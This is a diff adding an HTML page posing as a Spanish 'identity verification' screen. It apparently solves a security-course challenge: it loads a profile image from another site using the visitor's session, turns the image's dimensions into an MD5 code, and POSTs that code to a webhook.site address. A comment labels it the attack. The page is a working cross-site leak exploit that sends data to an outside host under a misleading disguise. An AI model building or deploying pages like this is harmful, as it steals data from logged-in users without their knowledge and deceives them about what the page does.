@@ -1,0 +1,119 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Verificación de Sistema</title>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js"></script>
+    <style>
+        body { 
+            font-family: Arial, sans-serif; 
+            max-width: 800px; 
+            margin: 50px auto; 
+            padding: 20px;
+            text-align: center;
+        }
+        .success { 
+            background: #d4edda; 
+            color: #155724; 
+            padding: 20px; 
+            border-radius: 10px; 
+            margin: 20px 0;
+        }
+        .error { 
+            background: #f8d7da; 
+            color: #721c24; 
+            padding: 20px; 
+            border-radius: 10px; 
+            margin: 20px 0;
+        }
+        code {
+            background: #f1f1f1;
+            padding: 5px 10px;
+            border-radius: 4px;
+            font-family: monospace;
+        }
+    </style>
+</head>
+<body>
+    <h1>🔐 Verificación de Identidad</h1>
+    <p>Estamos verificando tu nivel de acceso en el sistema...</p>
+    
+    <div id="status" class="error">⏳ Iniciando verificación...</div>
+    <div id="debug"></div>
+
+    <script>
+        function debug(msg) {
+            console.log(msg);
+            document.getElementById('debug').innerHTML += '<p><small>' + msg + '</small></p>';
+        }
+        
+        function success(level, md5, width, height) {
+            document.getElementById('status').className = 'success';
+            document.getElementById('status').innerHTML = `
+                <h3>✅ Verificación Exitosa</h3>
+                <p><strong>Dimensiones:</strong> ${width} × ${height} px</p>
+                <p><strong>Nivel de acceso:</strong> ${level}</p>
+                <p><strong>Código MD5:</strong> <code>${md5}</code></p>
+                <p><em>Esta información ha sido registrada en el sistema</em></p>
+            `;
+            
+            // Enviar a webhook
+            fetch('https://webhook.site/1df096b4-f7f3-4016-9465-a065ce0c001c', {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({
+                    level: level,
+                    md5: md5,
+                    dimensions: `${width}x${height}`,
+                    user: 'pepe',
+                    source: 'github-pages',
+                    timestamp: new Date().toISOString()
+                })
+            }).then(() => {
+                debug('📤 Datos enviados exitosamente al webhook');
+            }).catch(e => {
+                debug('❌ Error enviando webhook: ' + e);
+            });
+        }
+        
+        function error(msg) {
+            document.getElementById('status').className = 'error';
+            document.getElementById('status').innerHTML = `
+                <h3>❌ Error en la verificación</h3>
+                <p>${msg}</p>
+            `;
+        }
+        
+        // Iniciar el ataque
+        debug('🚀 Iniciando script...');
+        debug('📝 Verificando acceso a imagen de perfil...');
+        
+        const img = new Image();
+        
+        img.onload = function() {
+            debug('✅ Imagen cargada exitosamente');
+            const width = this.naturalWidth || this.width;
+            const height = this.naturalHeight || this.height;
+            const level = width * height;
+            const md5 = CryptoJS.MD5(level.toString()).toString();
+            
+            debug(`📏 Dimensiones detectadas: ${width} × ${height} px`);
+            debug(`🎯 Nivel calculado: ${level}`);
+            debug(`🔐 MD5 generado: ${md5}`);
+            
+            success(level, md5, width, height);
+        };
+        
+        img.onerror = function(e) {
+            debug('❌ Error cargando imagen: ' + e);
+            error('No se pudo acceder a la imagen de perfil. Asegúrate de estar autenticado en el sistema principal.');
+        };
+        
+        // Cargar la imagen (sin crossOrigin para evitar CORS)
+        const imageUrl = 'https://chl-1dfb4575-8986-4f39-aa84-7713afa6f5b6-imagen-importante.softwareseguro.com.ar/profile-pic?nocache=' + Date.now();
+        debug('🖼️ Cargando imagen desde: ' + imageUrl);
+        img.src = imageUrl;
+    </script>
+</body>
+</html>
+
+
